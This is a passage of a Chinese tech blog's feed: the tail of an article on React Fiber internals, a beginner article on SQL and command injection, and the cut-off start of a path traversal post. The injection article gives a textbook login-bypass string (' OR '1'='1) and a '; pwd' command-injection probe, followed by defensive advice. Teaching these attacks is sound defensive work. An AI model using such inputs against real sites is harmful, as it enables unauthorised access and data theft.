punctuation&quot;&gt;.&lt;/span&gt;alternate &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; workInProgress&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; workInProgress&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiber.new.js#L254&quot;&gt;source code&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;React 在第一次 render 時會將各節點紀錄為 Fiber Tree，而在之後檢查時會建立一個 workInProgress tree ，等待 workInProgress tree 完成後就會被當作 current tree，而此稱為&lt;code&gt;雙緩衝技術&lt;/code&gt; (double buffering)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://www.youtube.com/watch?v=ZCuYPiUIONs&amp;amp;t=1040s&quot;&gt;source video&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;effect-list&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#effect-list&quot;&gt;#&lt;/a&gt; Effect List&lt;/h2&gt;
&lt;p&gt;在上一張圖中，有標記標籤的元件是需要 side effect 進行處理的，為了達到高效的處理，因此需要將原本的樹狀咧表轉換為線性列表，才能夠快速的遍歷，除此之外還會省略沒有 side effect 的節點，流程如下圖：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;順序的部分是從子到父的方式去執行，在各個階段如果為該層結構&lt;strong&gt;第一個節點&lt;/strong&gt;會記錄在 firstEffect，其後則會記錄在 nextEffect 當中，並會在父層級將其合併起來並將自己綁入 lastEffect ，並向上傳遞，遇到沒有 effect 的節點會直接向上傳遞而不進行更動，最後將所有順序傳遞至 Root 層建立出如下圖的 effect list。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p8.png&quot; alt=&quot;Re: Effect list&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://youtu.be/ZCuYPiUIONs?t=1373&quot;&gt;source video&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0&quot;&gt;#&lt;/a&gt; Render 階段的工作循環&lt;/h2&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;workLoop&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;isYieldy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;isYieldy&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// Flush work without yielding&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;nextUnitOfWork &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      nextUnitOfWork &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;performUnitOfWork&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;nextUnitOfWork&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// Flush asynchronous work until the deadline runs out of time.&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;nextUnitOfWork &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shouldYield&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      nextUnitOfWork &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;performUnitOfWork&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;nextUnitOfWork&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在上面&lt;a href=&quot;https://github.com/facebook/react/blob/f765f022534958bcf49120bf23bc1aa665e8f651/packages/react-reconciler/src/ReactFiberScheduler.js#L1136&quot;&gt;程式碼&lt;/a&gt;中，nextUnitOfWork 存有 workInProgress 樹中的 Fiber nodes。當 React 輪詢 Fiber tree 時，它會使用這個變量來知曉是否有任何其他 Fiber nodes 具有未完成的工作。目前的 Fiber 處理完後，nextUnitOfWork 會指向下一個 Fiber node 或者 null (結束)。&lt;/p&gt;
&lt;p&gt;輪詢 Fiber trees 主要根據以下四個功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;performUnitOfWork&lt;/li&gt;
&lt;li&gt;beginWork&lt;/li&gt;
&lt;li&gt;completeUnitOfWork&lt;/li&gt;
&lt;li&gt;completeWork&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;執行順序參考如下圖：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p9.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://images.indepth.dev/images/2019/08/tmp2.gif&quot;&gt;source image&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由於透過了深度優先搜尋(DFS)，整個流程會優先執行底部 child node 的工作，最後才會到 parent node。&lt;/p&gt;
&lt;h2 id=&quot;commit-%E9%9A%8E%E6%AE%B5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#commit-%E9%9A%8E%E6%AE%B5&quot;&gt;#&lt;/a&gt; Commit 階段&lt;/h2&gt;
&lt;p&gt;在這個階段，React 會將 render phase 所產生的 workInProgress tree 轉移到 current tree，並執行 render phase 所比對所產生的 Effect list，此步驟將會有更新 Dom 的節點等等的操作，假如有不需更新的項目將不會包含在 Effect list 中，所以不會被 commit (更新)。&lt;/p&gt;
&lt;p&gt;而執行完後的 current tree 將會被放到 finishedWork tree 中。&lt;/p&gt;
&lt;p&gt;而在此階段將會觸發以下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;執行 getSnapshotBeforeUpdate event&lt;/li&gt;
&lt;li&gt;執行 componentWillUnmount event&lt;/li&gt;
&lt;li&gt;執行所有 DOM 操作&lt;/li&gt;
&lt;li&gt;將 finishedWork tree 設置為 current tree&lt;/li&gt;
&lt;li&gt;執行 componentDidMount event&lt;/li&gt;
&lt;li&gt;執行 componentDidUpdate event&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;dom-%E6%9B%B4%E6%96%B0&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dom-%E6%9B%B4%E6%96%B0&quot;&gt;#&lt;/a&gt; Dom 更新&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/facebook/react/blob/95a313ec0b957f71798a69d8e83408f40e76765b/packages/react-reconciler/src/ReactFiberScheduler.js#L376&quot;&gt;commitAllHostEffects&lt;/a&gt; 是React在其中執行DOM更新的函數。該函數定義了 Dom 需要執行的操作類型。&lt;/p&gt;
&lt;h2 id=&quot;%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component&quot;&gt;#&lt;/a&gt; 較少在用 class component ，那來談談 function component&lt;/h2&gt;
&lt;p&gt;時至今日，function component 搭配 hooks 幾乎已成了主流，而 function component 在渲染時可以避免多餘的判斷 (&lt;a href=&quot;https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L1306&quot;&gt;mountIndeterminateComponent&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p10.png&quot; alt=&quot;RE: React hooks&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://medium.com/the-guild/under-the-hood-of-reacts-hooks-system-eb59638c9dba&quot;&gt;under-the-hood-of-reacts-hooks-system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而大家常用的 &lt;a href=&quot;https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiberHooks.new.js&quot;&gt;hook&lt;/a&gt; 則會形成 hook 鍊，保存在 Fiber 的 memoizedState 中，通過 dispatcher 去更新 fiber 內的 state 及 effect 狀態：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; hook&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Hook &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  memoizedState&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// hook 的狀態&lt;/span&gt;&lt;br&gt;  baseState&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//起始 state&lt;/span&gt;&lt;br&gt;  baseQueue&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//起始 queue&lt;/span&gt;&lt;br&gt;  queue&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//需要更新的update&lt;/span&gt;&lt;br&gt;  next&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//下一個hook&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例如 const [state, updateState] = useState(initialState)， memoizedState 就是 initialState。&lt;/p&gt;
&lt;p&gt;每個 hook 都會被放到 queue 當中。當您調用 setState 函數時，React 其實不會立即調用 updater 函式，而是將其保存在隊列中並安排重新渲染。&lt;/p&gt;
&lt;!-- 至於優化常用的 [useMemo](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L370) 則會將元件改為較為[淺層的比對](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L456) --&gt;
&lt;h3 id=&quot;%E5%8F%83%E8%80%83&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83&quot;&gt;#&lt;/a&gt; 參考&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000039225217&quot;&gt;https://segmentfault.com/a/1190000039225217&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://twitter.com/acdlite/status/977291318324948992&quot;&gt;https://twitter.com/acdlite/status/977291318324948992&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react&quot;&gt;https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://www.bilibili.com/video/av48384879/&quot;&gt;https://www.bilibili.com/video/av48384879/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;延伸閱讀&lt;br&gt;
&lt;a href=&quot;https://segmentfault.com/a/1190000017241034?utm_source=sf-related&quot;&gt;https://segmentfault.com/a/1190000017241034?utm_source=sf-related&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（四）-認識注入攻擊（ Injection Attack）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/"/>
		<updated>2021-05-29T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;想像今天有個路人突然出現在你面前，拿著一管針筒不由分說的就要往你身上戳，相信正常人的第一反應要嘛拔腿就跑要嘛阻止他，但如果今天你沒想到會有這種狀況，不小心讓他注入成功會發生甚麼事？雖然有很多種可能，但相信我，那一定不會是甚麼好事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天想和大家聊聊常出現在網頁安全風險榜單上的常客，&lt;strong&gt;注入攻擊（ Injection Attack）&lt;/strong&gt;，聊聊這種風險到底是如何的危險，居然可以長年高居風險榜單的前三甲，如果我們的網站真的不幸被注入成功了，會導致甚麼樣的後果？如果真的這麼可怕的話，我們有沒有甚麼辦法可以阻止這種攻擊呢？在看完今天的文章之後，其實你會發現，原來這些攻擊離我們這麼近。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-injectionattack/p1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;strong&gt;photo by &lt;a href=&quot;https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827&quot;&gt;https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注入攻擊並不僅僅是指大家耳熟能詳，針對資料庫相關網頁應用程式/服務攻擊的 SQL Injection，其中也包括了植入惡意 shell 指令到網站主機作業系統的 Command Injection ，甚至之前曾介紹過的 XSS 攻擊也是屬於注入攻擊的一種。&lt;/p&gt;
&lt;p&gt;也因此，我想藉由這個機會跟大家介紹在 Injection 中比較容易被攻擊者發現並利用的兩種 Injection ： SQL Injection ＆ Command Injection&lt;/p&gt;
&lt;p&gt;（如果對 &lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;XSS 攻擊&lt;/a&gt; 有興趣的小夥伴可以看我之前的 XSS 介紹文章喔）&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5&quot;&gt;#&lt;/a&gt; 常見的攻擊策略&lt;/h3&gt;
&lt;p&gt;先說常見的攻擊策略，這應該是所有 Injection 都通用的，而針對 Injection 攻擊策略大致分為兩種 ，一種是所謂的盲注攻擊（ Blindfolded Injection），相當於攻擊者直接在大街上拿著針筒對你進行衝鋒，優點是不需要太多的準備和成本，只要無腦對網站塞入常見的注入範本就可以，不過也因為如此，所以成功機率偏低，畢竟大街上拿著針筒衝鋒被阻止的機率實在是有夠高的啦。&lt;/p&gt;
&lt;p&gt;第二種的話，攻擊者會藉由網站的錯誤訊息及意外洩漏的系統資訊，對網站進行針對式的注入，而這種攻擊策略其實通俗點的說法就是預謀殺人，藉由調查受害者的公司和住家以及上下班路線，接著埋伏拿著針筒對受害者進行注射，聽起來成功率就比第一種高多了，對吧？不過也因為這樣，所以攻擊者必須要耗費成本對網站進行資料收集，再把資料進行分析之後設計針對式的注入樣本，攻擊者才能進行攻擊，非常的耗費時間。&lt;/p&gt;
&lt;p&gt;不過根據我自身的經驗，其實目前的攻擊者通常是採取綜合式的攻擊策略，先用 Open Source 的弱點掃描工具對許多目標網站進行掃描，接著針對防禦最不完整的幾個網站進行盲注攻擊，再依據結果挑選成功可能性最高的目標網站進行針對性的攻擊設計，就像是拿著針筒對路上的每個人進行衝鋒，看起來反應最慢或是最沒反應的那幾個人，就會成為攻擊者的目標。&lt;/p&gt;
&lt;p&gt;而攻擊者利用注入攻擊的目的可以大致分類為三種，提權、獲取敏感資料、竄改資料，接下來我會在介紹攻擊的同時向大家說明當攻擊者達成以上三種任一目的時可能會產生的安全風險。&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9&quot;&gt;#&lt;/a&gt; 常見的攻擊介紹&lt;/h3&gt;
&lt;h4 id=&quot;sql-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#sql-injection&quot;&gt;#&lt;/a&gt; SQL Injection&lt;/h4&gt;
&lt;p&gt;SQL Injection 應該是屬於 Injection 界中無人不知無人不曉的名人了，以一個最常見的 SQL Injection 範本來舉例說明，當一個網站有帳號密碼必須輸入時，攻擊者在帳號／密碼的欄位輸入 admin／ admin 接著系統提示，密碼錯誤，於是攻擊者可以得知，有 admin 這個帳號，但是密碼錯誤，於是攻擊者便在密碼的欄位嘗試輸入 &lt;code&gt;”password’ OR ‘1’=’1&amp;quot;&lt;/code&gt; ，如果這個網站的資料庫語法是 &lt;code&gt;UserList.Password = ‘Password’&lt;/code&gt; 而且沒有限制輸入的話，整串驗證會變成 &lt;code&gt;UserList.Password = ‘password’ OR ‘1’=’1&#39;&lt;/code&gt; ，也就是說 ”Password”被當成了某個空白或者不重要的字串，而1 = 1 是 True 邏輯又是成立的，於是當帳號和密碼都是 True 的時候，會發生甚麼事呢？沒錯！攻擊者就可以以 admin 的權限登入網站為所欲為！&lt;/p&gt;
&lt;p&gt;如果以更生活化的例子來說明， SQL Injection 的原理其實就像是 PTT 的簽名檔裡常看到的扭曲意義推文一樣，舉例來說：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-injectionattack/p2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;strong&gt;photo by &lt;a href=&quot;https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html&quot;&gt;https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同樣的，攻擊者也是變更了資料庫中語法的意義，讓資料庫輸出了攻擊者想看到的結果，進而達成目的，除了可能造成剛剛說明的提權，導致攻擊者獲得 admin 權限以外， SQL Injection 也可能造成資料庫資料表中的資料外洩，例如企業及個人機密資料、帳戶資料、密碼等，甚至使攻擊者竄改網站，在網站加入惡意連結、惡意程式使企業商譽遭到破壞。&lt;/p&gt;
&lt;h4 id=&quot;command-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#command-injection&quot;&gt;#&lt;/a&gt; Command Injection&lt;/h4&gt;
&lt;p&gt;雖然 Command Injection 相較於 SQL Injection 並沒有那麼有名氣，但他造成的風險卻完全不遑多讓， Command Injection 簡單來說就是當攻擊者的惡意輸入被誤認為作業系統指令時就會發生指令注入，舉例來說，某網站的查詢欄位可以查詢資料，而攻擊者為了驗證網站是不是屬於 Linux 的系統，於是故意在查詢的內容中加上 ; 並輸入指令 pwd ，由於Linux可以利用分號來同時提交多個不同的指令，再加上 pwd 指令是可以用來顯示目前所在目錄&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-injectionattack/p3.jpeg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-injectionattack/p4.jpeg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;strong&gt;photo by &lt;a href=&quot;http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html&quot;&gt;http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;當上面的範例能夠確認指令被成功執行之後，對攻擊者的限制就只剩下攻擊者的想像力夠不夠了，例如攻擊者可以列出所有 Server 的目錄，查詢有價值的敏感資料，開放 Server 的服務，使 Server 變成攻擊者的跳板，放入勒索軟體或是後門等，為所欲為。&lt;/p&gt;
&lt;h3 id=&quot;%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87&quot;&gt;#&lt;/a&gt; 防範 Injection 的準則&lt;/h3&gt;
&lt;p&gt;相信以上的說明有讓各位小夥伴更加了解 Injection 到底是甚麼樣的攻擊以及 Injection 究竟可以造成甚麼樣的危害，那現在就讓我們來聊聊要怎麼樣才能不被針筒戳到。&lt;/p&gt;
&lt;p&gt;1. 使用正則表達式過濾使用者的輸入值以及包含在參數中的惡意程式，把輸入值中所有的單引號全部更改為雙引號，確保資料的輸入無論是有意或無意都不會因此被網站視為程式輸入。&lt;/p&gt;
&lt;p&gt;2. 限制輸入的字元格式不包含特殊符號，並確認欄位的合理輸入長度，例如出生年月日的欄位沒有必要開放到20個字元以上。&lt;/p&gt;
&lt;p&gt;3. 把系統及資料的使用者帳號權限最小權限化，避免攻擊者萬一獲取了某一個使用者的權限就等於獲得了可以讀寫的所有權限。&lt;/p&gt;
&lt;p&gt;4. 不要將系統或資料庫錯誤顯示於網頁之上，盡量避免透漏 Server 及資料庫的系統或是版本，以防自身網站成了攻擊者針對的目標。&lt;/p&gt;
&lt;h3 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Injection&lt;/strong&gt; 會這麼猖獗的原因在於要控制網站中每一個欄位的輸入以及 Server 和資料庫的系統或是版本是不是最新的，因為很有可能因為網站更新導致新增的欄位沒有設定驗證，或是 Server 和資料庫的系統及版本出現漏洞沒有即時更新，加上不同程式語言有不同輸入和檢查，加上 Injection 攻擊的成本不高，使得相關的攻擊層出不窮，因此，除了以上的四種方法以外，建議網站在合理的預算下進行定期的網站檢測，除了可以預防 Injection 以外，也能發現許多開發者非預期的風險發生。&lt;/p&gt;
&lt;h3 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h3&gt;
&lt;h4 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（二）- 認識 XSS（Cross-Site Scripting）&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;認識 XSS（Cross-Site Scripting）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h3&gt;
&lt;h4 id=&quot;sql%E6%B3%A8%E5%85%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#sql%E6%B3%A8%E5%85%A5&quot;&gt;#&lt;/a&gt; SQL注入&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/SQL%E6%B3%A8%E5%85%A5&quot;&gt;https://zh.wikipedia.org/wiki/SQL注入&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA&quot;&gt;#&lt;/a&gt; Command Injection運作原理與解說&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html&quot;&gt;http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（五）-路徑遍歷（Path Traversal）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/"/>
		<updated>2021-05-30T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
